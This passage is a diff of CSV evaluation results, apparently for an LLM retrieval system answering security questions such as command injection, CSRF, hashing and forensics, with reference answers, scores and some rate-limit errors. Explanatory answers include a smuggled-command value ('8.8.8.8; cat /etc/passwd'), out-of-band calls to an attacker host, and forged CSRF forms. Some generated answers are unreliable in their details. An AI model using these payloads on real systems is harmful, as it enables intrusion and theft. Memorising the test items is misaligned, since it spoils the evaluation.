+Using **both** server‑side input validation *and* context‑aware output encoding gives you a robust, layered defense that covers the full life‑cycle of user data—from entry to rendering—making it far more difficult for an attacker to succeed with an XSS attack.",42.25,11,15,doc2.txt; doc1.txt; doc42.txt,15.93,,,,,,,,skipped (model not loaded)
+21,What is the primary purpose of digital forensics?,"The primary purpose of digital forensics is the application of scientific methods to the identification, preservation, extraction, and documentation of digital evidence for use in legal proceedings or security investigations.","Digital forensics is primarily used to **identify, preserve, extract, and document digital evidence** so that investigators can determine what happened, when it happened, how it happened, and who was responsible—supporting both legal proceedings and internal security investigations.",77.0,1,1,doc25.txt; doc4.txt; doc23.txt,18.5,,,,,,,,skipped (model not loaded)
+22,How do forensic processes preserve evidence integrity?,"Forensic processes preserve evidence integrity by working from copies (forensic images) rather than original media, and by computing and verifying cryptographic hashes (MD5, SHA-256) of all evidence items.","**Forensic processes preserve evidence integrity by following a set of technical and procedural safeguards that ensure the original data is never altered and that any changes can be detected and documented. The key practices are:**
+
+| Practice | What it does | How it preserves integrity |
+|----------|--------------|----------------------------|
+| **Work from forensic copies** | Create a bit‑forensic image (e.g., with FTK Imager, `dd`, or `dcfldd`) of the original storage media. | The original drive or memory stick remains untouched; all analysis is performed on the copy, preventing accidental modification. |
+| **Use write‑blockers** | Hardware or software devices that block any write operations to the source media during imaging. | Guarantees that the imaging process cannot alter the source, even if the imaging software has a bug or is mis‑configured. |
+| **Compute cryptographic hashes** | Generate MD5, SHA‑1, SHA‑256 (or stronger) hashes of the source and of the forensic image immediately after acquisition. | Provides a verifiable fingerprint; any later change to the data will produce a different hash, making tampering obvious. |
+| **Document chain of custody** | Record who collected the evidence, when, where, how, and who accessed it thereafter. | Creates an audit trail that proves the evidence was handled in a controlled, traceable manner, supporting admissibility in court. |
+| **Minimise OS activity during memory acquisition** | Use memory‑forensic tools (e.g., Volatility’s `memdump`, `FTK Imager` memory capture) that avoid unnecessary system calls or page‑faults. | Reduces the risk that the act of capturing RAM overwrites or alters volatile data (e.g., encryption keys, process lists). |
+| **Validate imaging tools** | Verify that the imaging software itself is trustworthy (signed binaries, known hashes). | Prevents the use of compromised tools that could tamper with data during acquisition. |
+| **Use forensic‑grade hardware** | Employ dedicated forensic workstations with secure boot, tamper‑evident seals, and isolated networks. | Limits the chance that malware on the analyst’s machine could modify evidence or the analysis environment. |
+| **Apply time‑stamping and logging** | Record timestamps for every step (acquisition start/end, hash calculation, transfer). | Provides an additional layer of verification that the evidence was handled within a known timeframe. |
+
+**In practice, a forensic analyst will:**
+
+1. **Secure the source** (lock down the device, isolate it from the network).  
+2. **Acquire a forensic image** using a write‑blocker, immediately compute and store cryptographic hashes.  
+3. **Transfer the image** to a secure, isolated forensic workstation, re‑hash to confirm integrity.  
+4. **Document every action** in a chain‑of‑custody log, including timestamps, personnel, and tools used.  
+5. **Perform analysis** on the copy, never touching the original.  
+
+By combining these technical controls with rigorous procedural documentation, forensic processes maintain the integrity of digital evidence, ensuring it remains admissible and trustworthy for legal or investigative purposes.",47.98,19,24,doc25.txt; doc11.txt; doc23.txt,18.91,,,,,,,,skipped (model not loaded)
+23,What is the purpose of a chain of custody in digital forensics?,"The purpose of a chain of custody is to document tracking who collected evidence, when, where, how, and who had subsequent access to it, which is essential for evidence admissibility in legal proceedings.","The **chain of custody** is a formal record that documents every person who has handled a piece of digital evidence and every action taken with it. Its primary purposes are:
+
+1. **Preserve Evidence Integrity** – By tracking who accessed the evidence, when, and how, investigators can demonstrate that the data has not been altered, corrupted, or tampered with since it was first collected.
+
+2. **Establish Accountability** – The record shows a clear, auditable trail of custody, making it possible to identify any gaps or unauthorized access that could compromise the evidence.
+
+3. **Ensure Legal Admissibility** – Courts require that evidence be collected and handled in a way that maintains its integrity. A complete chain of custody is the key documentation that satisfies this requirement, allowing the evidence to be admitted in civil or criminal proceedings.
+
+In short, the chain of custody protects the evidentiary value of digital artifacts by proving that they have been preserved in a forensically sound manner and that their authenticity can be verified.",50.75,6,7,doc25.txt; doc11.txt; doc23.txt,18.04,,,,,,,,skipped (model not loaded)
+24,What is the difference between log clearing and secure deletion in anti-forensics?,"Log clearing involves clearing Windows event logs (Event ID 1102 or 104) or deleting Unix syslog entries, whereas secure deletion involves overwriting data before deletion to prevent recovery.","**Log clearing**  
+- **What it does:** Removes or truncates the contents of a log file (e.g., Windows Event Log, Unix syslog).  
+- **Typical indicators:** In Windows, the event that the log was cleared is itself logged (Event ID 1102 or 104). In Unix, the absence of entries or a “log rotated” entry can signal that logs were purged.  
+- **Goal for the attacker:** Hide the record of actions that produced the log entries (e.g., failed logons, file modifications).  
+- **Result for investigators:** The original log data is gone, but the act of clearing is often itself a forensic artefact that can be detected.
+
+**Secure deletion**  
+- **What it does:** Overwrites the target data (files, memory, disk sectors) with random or patterned data before deleting the file pointer, making the original content unrecoverable.  
+- **Typical indicators:** No direct forensic artefact of the deletion itself; the only evidence is the absence of recoverable data.  
+- **Goal for the attacker:** Prevent any forensic recovery of the deleted content (e.g., malware binaries, exfiltrated files, or sensitive documents).  
+- **Result for investigators:** The data is effectively gone; investigators must rely on other sources (memory, network traffic, backups) to reconstruct what was deleted.
+
+**Key difference:**  
+- **Scope:** Log clearing targets log files; secure deletion targets arbitrary files or data.  
+- **Detectability:** Log clearing often leaves a trace (the “log cleared” event); secure deletion leaves no recoverable data and is harder to detect directly.  
+- **Purpose:** Log clearing removes evidence of the attacker’s actions; secure deletion removes evidence of the attacker’s payload or stolen data.",42.37,10,12,doc25.txt; doc12.txt; doc11.txt,24.08,,,,,,,,skipped (model not loaded)
+25,Why is it essential to engage legal counsel early in a digital forensic investigation?,"It is essential to engage legal counsel early in a digital forensic investigation because evidence collected for criminal prosecution must meet admissibility standards, and security teams must understand the boundary between corporate policy investigations and matters that may lead to criminal prosecution.","**Engaging legal counsel early in a digital‑forensic investigation is essential because:**
+
+| Why it matters | What legal counsel helps with |
+|----------------|------------------------------|
+| **Admissibility of evidence** | Ensures that evidence is collected, preserved, and documented in a way that meets court standards (e.g., Daubert in U.S. federal courts). Counsel can advise on chain‑of‑custody procedures, proper use of write‑blockers, and hash verification to satisfy evidentiary rules. |
+| **Scope and limits of collection** | Helps define what data can be legally seized or accessed, respecting privacy laws, employment agreements, and jurisdictional constraints. This prevents over‑reach that could invalidate evidence or expose the organization to liability. |
+| **Compliance with regulatory reporting** | Provides guidance on mandatory breach‑notification timelines (e.g., GDPR’s 72‑hour rule) and the specific information that must be disclosed to regulators, law‑enforcement, or insurers. |
+| **Coordination with law‑enforcement** | Determines when and how to involve external agencies, what information can be shared, and how to preserve the integrity of the investigation for potential criminal prosecution. |
+| **Risk mitigation for the organization** | Advises on internal policies, employee privacy rights, and HR implications, reducing the risk of wrongful disciplinary action or litigation. |
+| **Strategic decision‑making** | Informs the incident‑response team on legal ramifications of containment, eradication, and recovery actions (e.g., whether to delete logs, how to handle data exfiltration evidence). |
+
+**Bottom line:** Early legal counsel involvement safeguards the forensic process, ensures evidence remains admissible, protects the organization from legal exposure, and aligns the investigation with regulatory and law‑enforcement requirements. Without this guidance, the investigation risks producing evidence that can be challenged in court, missing mandatory notifications, or violating employee privacy laws.",46.63,10,11,doc25.txt; doc11.txt; doc30.txt,20.14,,,,,,,,skipped (model not loaded)
+26,What is command injection?,Command injection is a vulnerability that allows an attacker to execute arbitrary operating system commands on the server running the application.,"**Command injection** is a type of injection flaw that lets an attacker run arbitrary operating‑system commands on the server that hosts a web application.  
+It occurs when the application takes user‑supplied data and places it directly into a shell command string (or otherwise passes it to a program that interprets it as shell input) without properly sanitising or escaping that data.  
+
+### How it works
+1. **User input is concatenated into a command** – e.g., `subprocess.run(f""ping -c 1 {user_input}"", shell=True)` in Python.  
+2. **Shell metacharacters** (such as `;`, `|`, `&&`, `||`, backticks, `$()`, newlines) terminate or extend the intended command.  
+3. The attacker supplies a payload that ends the original command and injects a new one, e.g., `8.8.8.8; cat /etc/passwd`.  
+4. The shell executes both commands, giving the attacker whatever privileges the web‑server process runs with.
+
+### Variants
+- **Blind command injection** – the application does not return command output. Attackers infer success via timing delays, out‑of‑band requests, or conditional responses.  
+- **Argument injection** – even without a shell, user input that controls command arguments can alter behaviour (e.g., passing `--config` to a program).
+
+### Impact
+- Executes with the web‑server’s privileges (root → full system compromise; lower privileges → data exfiltration, lateral movement, reverse shells).  
+- Can read sensitive files, modify configuration, or launch further attacks.
+
+### Prevention
+1. **Avoid shell invocation** – use language APIs that do not spawn a shell (`subprocess.run([...], shell=False)` in Python).  
+2. **Parameterised calls** – pass arguments as a list or structured data, not as a single string.  
+3. **Input validation** – whitelist acceptable values (e.g., hostnames matching `[a-zA-Z0-9.-]+$`).  
+4. **Least privilege** – run the web application under a non‑root account.  
+5. **WAFs** – can detect common patterns but should not be the sole defence.  
+6. **Regular audits & testing** – penetration tests, static analysis, and code reviews.
+
+Command injection is listed under OWASP’s “Injection” category (A03) in the 2021 Top 10 and remains a critical, high‑impact vulnerability.",43.4,11,20,doc41.txt; doc1.txt; doc19.txt,19.26,,,,,,,,skipped (model not loaded)
+27,How do attackers exploit command injection vulnerabilities?,"Attackers exploit command injection vulnerabilities by terminating the intended command and injecting arbitrary commands using shell metacharacters such as semicolons, pipes, and command substitutions.","**How attackers exploit command‑injection vulnerabilities**
+
+1. **Identify a vulnerable endpoint**  
+   • The attacker finds a web page, API, or script that accepts user‑supplied data and passes it to an operating‑system command (e.g., `ping`, `curl`, `ls`, `cat`, `awk`, etc.).  
+   • Common places: file‑upload handlers, search boxes, URL parameters, form fields, or any code that builds a shell command string.
+
+2. **Inject shell metacharacters**  
+   • The attacker appends or replaces part of the command with shell metacharacters that the shell interprets as control operators.  
+   • Typical payloads:  
+     - `;` – command separator (ends the intended command, starts a new one).  
+     - `|` – pipe output to another command.  
+     - `&&` / `||` – conditional execution.  
+     - `` ` `` or `$()` – command substitution.  
+     - Newlines or carriage returns – also act as separators in many shells.  
+   • Example:  
+     ```text
+     8.8.8.8; cat /etc/passwd
+     ```  
+     If the application runs `ping -c 1 $user_input` with `shell=True`, the shell executes `ping -c 1 8.8.8.8` **then** `cat /etc/passwd`.
+
+3. **Execute arbitrary OS commands**  
+   • Once the shell interprets the injected metacharacter, the attacker’s command runs with the privileges of the web‑server process.  
+   • The attacker can read files, modify configuration, launch reverse shells, or trigger other system actions.
+
+4. **Use blind or out‑of‑band techniques when output is hidden**  
+   • **Blind injection**: The application does not return command output. Attackers infer success by:  
+     - **Time delays** – e.g., `sleep 5` and measuring response latency.  
+     - **Conditional responses** – e.g., `if [ -f /etc/passwd ]; then sleep 5; fi`.  
+   • **Out‑of‑band channels** – the injected command causes the server to contact an attacker‑controlled host (DNS lookup, HTTP request, SMTP send).  
+     - Example: `curl http://attacker.com` or `ping -c 1 attacker.com`.  
+   • These techniques let attackers confirm command execution even when the web app suppresses output.
+
+5. **Escalate or pivot**  
+   • With a command injection, attackers can read sensitive files (database credentials, API keys), install backdoors, or use the compromised host as a foothold to attack other systems on the network.
+
+**Key take‑aways**
+
+- Command injection is enabled by **directly concatenating user input into a shell command**.  
+- Attackers exploit **shell metacharacters** to terminate the intended command and inject new ones.  
+- Even when output is hidden, attackers can use **time‑based or out‑of‑band** methods to confirm execution.  
+- The impact depends on the privileges of the web‑server process; running as root can lead to full system compromise.",44.63,14,23,doc41.txt; doc1.txt; doc2.txt,8.79,,,,,,,,skipped (model not loaded)
+28,What is the primary defence against command injection?,The primary defence against command injection is to not invoke OS commands based on user input where alternatives exist.,"**Primary defence:**  
+Never pass user‑supplied data to a shell. Use the language’s safe, non‑shell APIs (e.g., `subprocess.run()` with a list and `shell=False` in Python) or other language‑specific mechanisms that execute commands without invoking a shell interpreter. This eliminates the possibility of shell metacharacters being interpreted and thus blocks command injection.",52.11,3,3,doc41.txt; doc1.txt; doc15.txt,25.56,,,,,,,,skipped (model not loaded)
+29,Why is it essential to run web applications with minimal privileges?,"Running web applications with minimal privileges limits the impact of command injection, as it prevents attackers from executing commands with elevated privileges.","**Running a web application with the least privilege possible is a core security practice because it directly limits the damage an attacker can do if a vulnerability is exploited.**  
+
+| Why it matters | What it protects against | Practical impact |
+|-----------------|--------------------------|------------------|
+| **Command‑Injection & OS‑Injection** | An attacker can execute arbitrary shell commands that run with the same rights as the web server process. | If the server runs as *root*, the attacker gains full control of the host, can install back‑doors, delete data, or pivot to other systems. Even a non‑root account can read configuration files, steal credentials, or launch lateral movement. |
+| **Injection in general (SQL, LDAP, etc.)** | Malicious input can alter queries or commands. | With higher privileges, the attacker can modify or delete critical data, bypass authentication, or exfiltrate sensitive information. |
+| **Server‑Side Request Forgery (SSRF)** | The application can reach internal services or cloud metadata endpoints. | A privileged process can read internal secrets, trigger privileged APIs, or use internal network resources to launch further attacks. |
+| **Privilege‑Escalation bugs** | Vulnerabilities in the OS or application stack may allow an attacker to elevate privileges. | Even if the web server is not root, an escalation bug could still give the attacker root or other high‑privilege accounts. |
+| **Compliance & audit** | Many standards (PCI‑DSS, HIPAA, NIST) require least‑privilege controls. | Running with minimal rights helps satisfy audit requirements and reduces the risk of non‑compliance penalties. |
+
+### Key points
+
+1. **Containment** – If the web process is compromised, the attacker’s reach is limited to the resources the process can access.  
+2. **Damage reduction** – Sensitive files (e.g., `/etc/passwd`, database credentials, application secrets) are protected because the process cannot read them.  
+3. **Easier monitoring** – An attacker who can only run a narrow set of commands is easier to detect and mitigate.  
+4. **Defense‑in‑depth** – Least privilege is a foundational layer that complements other controls such as input validation, parameterised APIs, WAFs, and secure coding practices.  
+
+### Bottom line
+
+Running web applications with minimal privileges is essential because it turns a successful exploitation of a vulnerability (e.g., command injection) from a catastrophic system compromise into a contained incident that is far easier to detect, contain, and remediate. It is a practical, low‑cost, high‑impact security measure that should be applied to every web service, regardless of the underlying platform.",40.9,12,18,doc41.txt; doc19.txt; doc39.txt,22.05,,,,,,,,skipped (model not loaded)
+30,What is related to command injection and can alter a command's behaviour even without shell invocation?,"Argument injection is related to command injection and can alter a command's behaviour even without shell invocation, for example, by passing --exec or --config arguments to programs that interpret them.","**Argument Injection** – a form of injection that can change a command’s behavior even when no shell is invoked.  
+
+When user input is passed directly as an argument to a program (e.g., `--config`, `--exec`, `--user`), an attacker can supply values that alter the program’s logic or execution path. Unlike classic command injection, the payload is interpreted by the target application or the called program itself, not by a shell. Proper defense requires strict validation and whitelisting of allowed argument values.",59.31,3,4,doc41.txt; doc1.txt; doc19.txt,19.61,,,,,,,,skipped (model not loaded)
+31,What is Cross-Site Request Forgery (CSRF)?,Cross-Site Request Forgery (CSRF) is an attack that tricks an authenticated user's browser into making an unwanted request to a web application they are currently authenticated to.,"**Cross‑Site Request Forgery (CSRF)** is a web‑application attack that tricks an authenticated user’s browser into sending an unwanted request to a site where the user is already logged in. Because browsers automatically attach the user’s session cookies to every request to that domain, the attacker can cause the victim to perform state‑changing actions (e.g., transfer money, change a password, delete a record) without the victim’s knowledge or consent.
+
+### How it works
+1. **Victim is authenticated** to a target site (e.g., `bank.com`) and has a valid session cookie stored in the browser.  
+2. **Victim visits a malicious site** (e.g., `attacker.com`).  
+3. The malicious page contains a hidden request that targets the victim’s site, such as:
+   ```html
+   <img src=""https://bank.com/transfer?to=attacker&amount=10000"">
+   ```
+   or a hidden form that auto‑submits:
+   ```html
+   <form action=""https://bank.com/transfer"" method=""POST"">
+     <input name=""to"" value=""attacker"">
+     <input name=""amount"" value=""10000"">
+   </form>
+   <script>document.forms[0].submit();</script>
+   ```
+4. The browser sends the request to `bank.com` **with the victim’s session cookie**.  
+5. If the target site processes the request (e.g., performs a fund transfer), the action is executed as if the victim had performed it.
+
+### Key characteristics
+- **No JavaScript needed**: The attack relies on the browser’s automatic cookie handling, not on executing code in the victim’s browser.  
+- **Same‑origin policy**: The attacker cannot read the response or the cookie value, which limits the attack to state‑changing actions.  
+- **Different from XSS**: XSS injects code into the victim’s browser; CSRF exploits the server’s trust in the browser. If a site is vulnerable to XSS, CSRF defenses can often be bypassed.
+
+### Common defenses
+| Technique | How it works | Notes |
+|-----------|--------------|-------|
+| **CSRF tokens (Synchroniser Token Pattern)** | Server generates a unique, unpredictable token per session or request, embeds it in forms, and validates it on submission. | Most widely used; requires server‑side support. |
+| **Double‑submit cookie** | Token is sent both as a cookie and as a request parameter; server checks they match. | Less secure if cookie attributes are misconfigured. |
+| **SameSite cookie attribute** | `SameSite=Strict` or `SameSite=Lax` prevents browsers from sending the cookie on cross‑site requests. | Default in modern browsers; strong protection when used on session cookies. |
+| **Origin/Referer header check** | Server verifies that the request’s `Origin` or `Referer` header matches the expected domain. | Useful as a defense‑in‑depth layer, but not foolproof (headers can be omitted). |
+
+By combining these controls—especially CSRF tokens or SameSite cookies—most modern web applications can effectively mitigate CSRF attacks.",49.93,18,21,doc42.txt; doc2.txt; doc29.txt,22.09,,,,,,,,skipped (model not loaded)
+32,How does a CSRF attack work when a victim visits a malicious page?,"A malicious image tag or form on the malicious page can trigger a GET or POST request to the victim's authenticated web application, which the browser sends with the victim's session cookie.","**Short answer**
+
+When a victim who is already logged into a trusted site (e.g., bank.com) opens a malicious page on another domain (attacker.com), the victim’s browser automatically sends the victim’s session cookie with any request it makes to bank.com. The attacker’s page contains a hidden request (image tag, form, or script‑less HTTP call) that targets a state‑changing endpoint on bank.com. Because the browser includes the cookie, bank.com processes the request as if it came from the victim, performing the unwanted action without the victim’s knowledge.
+
+---
+
+### Step‑by‑step walk‑through
+
+| Step | What happens | Why it works |
+|------|--------------|--------------|
+| **1. Victim is authenticated** | The victim logs into bank.com and receives a session cookie (e.g., `SESSIONID=abc123`). | The cookie is stored in the browser and is automatically sent with every request to bank.com. |
+| **2. Victim visits attacker.com** | The attacker hosts a malicious page that the victim opens (e.g., by clicking a link or opening an email). | The page is served from a different origin (`attacker.com`). |
+| **3. Malicious page issues a request to bank.com** | The page contains a request that the browser will send automatically, such as: <br>```html<br><img src=""https://bank.com/transfer?to=attacker&amount=10000"">```<br>or a hidden form that auto‑submits: <br>```html<br><form action=""https://bank.com/transfer"" method=""POST""><input name=""to"" value=""attacker""><input name=""amount"" value=""10000""></form><script>document.forms[0].submit();</script>``` | The browser follows the request (GET or POST) without any user interaction. |
+| **4. Browser includes the victim’s cookie** | Because the request is to `bank.com`, the browser attaches the stored `SESSIONID=abc123` cookie. | The cookie proves to bank.com that the request is coming from an authenticated session. |
+| **5. Bank.com processes the request** | The server receives the request, sees the valid session cookie, and executes the requested action (e.g., transfer funds). | The server trusts the cookie and does not know the request originated from a malicious site. |
+| **6. Victim is unaware** | The victim sees no indication that anything happened; the malicious page may even redirect or close. | CSRF exploits the browser’s automatic cookie handling and the server’s trust in that cookie. |
+
+---
+
+### Key points
+
+* **No JavaScript needed** – the attack can be performed with plain HTML elements (image, form, iframe, etc.).
+* **Same‑origin policy protects the attacker** – the attacker cannot read the response or the victim’s cookie, but they don’t need to; they only need the cookie to be sent.
+* **State‑changing actions** – CSRF is most dangerous when the target endpoint changes state (POST, PUT, DELETE, etc.). GET requests that perform actions are a design flaw and should be avoided.
+* **Defences** – CSRF tokens, SameSite cookies, Origin/Referer checks, and proper HTTP methods all mitigate the risk.
+
+---
+
+**Bottom line:** A CSRF attack works by tricking the victim’s browser into sending an authenticated request to a trusted site while the victim is on a malicious page. The browser’s automatic inclusion of session cookies turns the victim into an unwitting accomplice.",53.73,20,22,doc42.txt; doc2.txt; doc08.txt,7.31,,,,,,,,skipped (model not loaded)
+33,What is the main difference between CSRF and XSS attacks?,"CSRF exploits the server's trust in the browser (cookie-based session), while XSS exploits the browser's trust in the server (injected scripts).","**Main difference**
+
+| Feature | CSRF | XSS |
+|---------|------|-----|
+| **What is abused** | The web application’s trust in the user’s browser (automatic inclusion of session cookies). | The browser’s trust in the web application (executing code that appears to come from a trusted site). |
+| **Typical payload** | A harmless-looking request (e.g., an image tag or hidden form) that triggers a state‑changing action on the target site. | Malicious JavaScript that runs in the victim’s browser, often injected into page content. |
+| **Requires JavaScript?** | No – the attack can be carried out with plain HTML (e.g., `<img>` or `<form>`). | Yes – the attacker needs to inject and execute script. |
+| **Can read responses?** | No – same‑origin policy blocks reading the response of the forged request. | Yes – once the script runs, it can read the page, steal cookies, etc. |
+| **Typical impact** | Performs an unwanted action on behalf of the user (e.g., fund transfer, account change). | Steals credentials, hijacks sessions, defaces pages, or performs any action the script can do. |
+
+In short, **CSRF tricks a user’s authenticated browser into sending a legitimate request to a site they’re logged into, while XSS injects malicious code that runs in the victim’s browser, giving the attacker far more power.**",49.87,10,11,doc2.txt; doc42.txt; doc3.txt,11.63,,,,,,,,skipped (model not loaded)
+34,Why is the SameSite Cookie Attribute considered a strong CSRF protection measure?,"The SameSite attribute prevents browsers from including cookies in cross-site requests, making it difficult for attackers to exploit session cookies.","**SameSite cookies block the very mechanism that CSRF exploits.**  
+
+A CSRF attack works because a victim’s browser automatically attaches the user’s session cookie to any request it sends to the target domain, even if that request was triggered from a malicious site. The attacker can therefore “piggy‑back” on the victim’s authenticated session without needing to read or write any data.
+
+The `SameSite` attribute tells the browser *not* to send the cookie when the request originates from a different site:
+
+| SameSite value | Effect on cross‑site requests |
+|----------------|------------------------------|
+| **Strict** | The cookie is never sent in any cross‑site request (GET, POST, etc.). |
+| **Lax** | The cookie is omitted for cross‑site **POST** requests (the common CSRF target), but is sent for top‑level **GET** navigations. |
+
+Because CSRF attacks almost always involve a state‑changing POST (or sometimes a GET that performs an action), setting `SameSite=Strict` or `SameSite=Lax` on the session cookie means the browser will not include that cookie in the forged request. The server therefore sees no authenticated session and rejects the action.
+
+Key points that make it a *strong* protection:
+
+1. **Browser‑enforced** – It works without any server‑side logic; the browser simply refuses to send the cookie.
+2. **Default in modern browsers** – Most browsers now default to `SameSite=Lax` for cookies that lack the attribute, giving immediate protection.
+3. **Defence‑in‑depth** – It complements other CSRF mitigations (tokens, Origin checks) and is effective even if those controls are mis‑configured or bypassed.
+4. **Low overhead** – No extra code or runtime checks are required; it’s a declarative header on the cookie.
+
+In short, SameSite removes the attacker’s ability to piggy‑back on the victim’s authenticated session, which is the core of CSRF, making it a robust first line of defense.",46.47,9,12,doc42.txt; doc29.txt; doc2.txt,8.51,,,,,,,,skipped (model not loaded)
+35,What is the purpose of the X-Frame-Options header in defending against Clickjacking?,"The X-Frame-Options header directs browsers not to render the page in a frame, preventing attackers from overlaying a legitimate site over a malicious page.","The **X‑Frame‑Options** HTTP response header tells browsers whether a page is allowed to be displayed inside a `<frame>`, `<iframe>`, or `<object>`.  
+By setting this header, a site can:
+
+* **Prevent clickjacking** – block malicious sites from embedding the page in a hidden or transparent frame so users cannot unknowingly click on the underlying content.  
+* **Control framing scope** – with `DENY` the page can never be framed, and with `SAMEORIGIN` it can only be framed by pages from the same origin.
+
+Thus, X‑Frame‑Options is a simple, widely‑supported defense that stops attackers from tricking users into interacting with a page that is being rendered inside another site’s frame.",43.94,3,4,doc42.txt; doc2.txt; doc08.txt,17.48,,,,,,,,skipped (model not loaded)
+36,What is the primary purpose of cryptographic hash functions?,"Cryptographic hash functions produce a fixed-size digest (hash) from arbitrary-length input data, with properties that make them suitable for integrity verification, digital signatures, and password storage.","Cryptographic hash functions are designed to take data of any length and produce a fixed‑size, seemingly random digest that can be used as a one‑way “fingerprint” of the original data. Their primary purpose is to enable **data integrity and authentication**—verifying that data has not been altered and, in the case of digital signatures, proving the origin of a message. They are also used (with additional mechanisms such as salting and key stretching) for secure password storage, but the core function is to provide a fast, irreversible, collision‑resistant hash for integrity checks.",51.77,3,3,doc45.txt; doc4.txt; doc40.txt,4.24,,,,,,,,skipped (model not loaded)
+37,What is the difference between pre-image resistance and second pre-image resistance in cryptographic hash functions?,"Pre-image resistance prevents reversing the hash to recover the original data, while second pre-image resistance prevents replacing a known file with a malicious one having the same hash.","**Pre‑image resistance** and **second pre‑image resistance** are two distinct security properties of a hash function:
+
+| Property | What it protects against | Typical scenario |
+|----------|--------------------------|------------------|
+| **Pre‑image resistance** | Given a hash value *H*, it must be computationally infeasible to find **any** input *M* such that `hash(M) = H`. | An attacker sees a stored hash (e.g., a password hash) and tries to recover the original password. |
+| **Second pre‑image resistance** | Given a specific input *M₁* and its hash `H = hash(M₁)`, it must be infeasible to find a **different** input *M₂ ≠ M₁* that produces the same hash (`hash(M₂) = H`). | An attacker has a known file (or message) and wants to replace it with a malicious file that still passes the hash check. |
+
+**Key differences**
+
+1. **Known vs. unknown input**  
+   - *Pre‑image*: attacker only knows the hash, not the original input.  
+   - *Second pre‑image*: attacker knows one specific input and its hash, and seeks a collision with that particular input.
+
+2. **Goal**  
+   - *Pre‑image*: recover the original data.  
+   - *Second pre‑image*: create a different piece of data that masquerades as the original.
+
+3. **Difficulty**  
+   - Both are hard, but the second pre‑image problem is generally considered easier than the pre‑image problem because the attacker has a concrete target (the known input) rather than any arbitrary input.
+
+In short, **pre‑image resistance** stops an attacker from finding any input that matches a given hash, while **second pre‑image resistance** stops an attacker from finding a *different* input that matches the hash of a specific known input.",51.89,10,11,doc45.txt; doc4.txt; doc16.txt,18.96,,,,,,,,skipped (model not loaded)
+38,Why should MD5 not be used for digital signatures or certificate fingerprints?,"MD5 is fully broken for security purposes and has been demonstrated to have practical collision attacks, making it unsuitable for secure applications.","**MD5 should not be used for digital signatures or certificate fingerprints because it is cryptographically broken and vulnerable to collision attacks that can be exploited in real‑world scenarios.**
+
+| Reason | Explanation |
+|--------|-------------|
+| **Collision attacks are practical** | Since 1996, researchers have demonstrated that two distinct inputs can be crafted to produce the same MD5 hash. By 2004 the algorithm was considered “fully broken” for security purposes. |
+| **Digital signatures rely on collision resistance** | A signature scheme (e.g., RSA‑MD5, DSA‑MD5) verifies that a message’s hash matches the signed hash. If an attacker can produce a different message with the same MD5 digest, they can forge a valid signature for a malicious document. |
+| **Certificate fingerprints use MD5 for integrity checks** | Browsers and TLS libraries compare the MD5 fingerprint of a server’s certificate against a known value. If an attacker can generate a colliding certificate, they could present a fraudulent certificate that passes the fingerprint check. |
+| **Modern standards have deprecated MD5** | NIST deprecated SHA‑1 in 2011 and MD5 earlier; browsers no longer accept MD5‑signed TLS certificates. The industry has moved to SHA‑256/384/512 or SHA‑3 for signatures and fingerprints. |
+| **No practical countermeasures** | Unlike some hash functions where a “salt” or key can mitigate collision risks, MD5’s weakness is inherent to its design; no configuration can restore its security. |
+
+**Bottom line:** Because MD5 can be broken in a matter of minutes on commodity hardware, using it for any purpose that requires assurance of integrity—such as digital signatures or certificate fingerprints—creates a critical vulnerability that attackers can exploit. Use SHA‑256/384/512 or SHA‑3 instead.",38.27,7,11,doc45.txt; doc25.txt; doc36.txt,22.44,,,,,,,,skipped (model not loaded)
+39,How does Argon2 resist GPU attacks?,"Argon2 is resistant to GPU attacks due to its memory-hard properties, making parallelism on GPUs/ASICs more costly.","**Argon2’s resistance to GPU‑based brute‑force comes from its *memory‑hard* design.**  
+
+| Feature | How it thwarts GPUs |
+|---------|---------------------|
+| **Large, tunable memory requirement** | Each hash computation must allocate a memory array of size *m* (e.g., 64 MiB or more). GPUs have far less on‑chip memory per core and rely on high‑bandwidth DRAM; filling and accessing a huge array is far slower than the raw compute throughput that GPUs excel at. |
+| **Sequential, data‑dependent memory accesses** | The algorithm fills the array in a pseudo‑random order and then repeatedly reads/writes blocks that depend on previously computed blocks. This pattern prevents the GPU from pre‑fetching or vectorizing the memory accesses, forcing each core to wait for memory latency. |
+| **Time‑cost (iterations) and parallelism parameters** | The *t* (time cost) parameter forces the algorithm to repeat the memory‑access loop many times. Even if a GPU could compute one hash quickly, the repeated memory traffic limits the number of hashes it can process per second. |
+| **Argon2d variant** | Uses *data‑dependent* memory addresses, making it even harder for a GPU to predict which memory locations will be accessed next. This eliminates the GPU’s ability to cache or pre‑fetch, further reducing throughput. |
+| **Argon2i variant** | Uses *data‑independent* memory accesses, which are still memory‑bound and thus GPU‑inefficient, but protect against side‑channel attacks. |
+| **Hybrid Argon2id** | Combines the best of both worlds: the first few passes use data‑independent accesses (for side‑channel safety), then switch to data‑dependent passes (for GPU resistance). |
+
+**Bottom line:**  
+Argon2 forces each password hash to perform a large amount of memory traffic that is sequential and data‑dependent. GPUs, which are optimized for compute‑heavy, highly parallel workloads with predictable memory access patterns, cannot keep up. As a result, the hash rate on a GPU is dramatically lower than on a CPU, making Argon2 a strong defense against GPU‑accelerated password cracking.",30.58,4,13,doc08.txt; doc45.txt; doc40.txt,19.86,,,,,,,,skipped (model not loaded)
+40,What is the purpose of salting in password hashing?,"Salting prevents precomputed rainbow table attacks and ensures identical passwords produce different hashes, making it a crucial component of secure password storage.",,,,,,,"Error code: 429 - {'error': {'message': 'Rate limit reached for model `openai/gpt-oss-20b` in organization `org_01kstjnf3kfhzsy8phd3g1g2sc` service tier `on_demand` on tokens per day (TPD): Limit 200000, Used 197207, Requested 2975. Please try again in 1m18.624s. Need more tokens? Upgrade to Dev Tier today at https://console.groq.com/settings/billing', 'type': 'tokens', 'code': 'rate_limit_exceeded'}}",,,,,,,skipped (model not loaded)
+41,What is the primary function of a firewall in network security?,"Firewalls filter incoming and outgoing traffic based on defined security rules to prevent unauthorized access, misuse, modification, or denial of a computer network and its accessible resources.",,,,,,,"Error code: 429 - {'error': {'message': 'Rate limit reached for model `openai/gpt-oss-20b` in organization `org_01kstjnf3kfhzsy8phd3g1g2sc` service tier `on_demand` on tokens per day (TPD): Limit 200000, Used 197164, Requested 3093. Please try again in 1m51.023999999s. Need more tokens? Upgrade to Dev Tier today at https://console.groq.com/settings/billing', 'type': 'tokens', 'code': 'rate_limit_exceeded'}}",,,,,,,skipped (model not loaded)
